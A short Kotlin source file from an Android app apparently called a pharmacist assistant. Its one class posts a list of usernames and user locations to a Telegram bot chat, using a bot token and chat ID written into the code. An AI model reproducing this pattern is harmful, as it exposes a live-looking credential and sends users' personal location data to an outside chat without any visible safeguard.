package com.example.pharmacistassistant

import okhttp3.*
import java.io.IOException

class TelegramBotService {
    private val client = OkHttpClient()
    private val botToken = "7313336526:AAGqqM1KOUcqeAvXfx3acBo0xbRFmAbVot8"
    private val chatId = "6498297404"

    fun sendUserData(users: List<Pair<String, String>>): Boolean {
        val message = users.joinToString("\n") { (username, location) ->
            "Username: $username, Location: $location"
        }

        val request = Request.Builder()
            .url("https://api.telegram.org/bot$botToken/sendMessage")
            .post(FormBody.Builder()
                .add("chat_id", chatId)
                .add("text", message)
                .build())
            .build()

        return try {
            val response = client.newCall(request).execute()
            response.isSuccessful
        } catch (e: IOException) {
            false
        }
    }
}
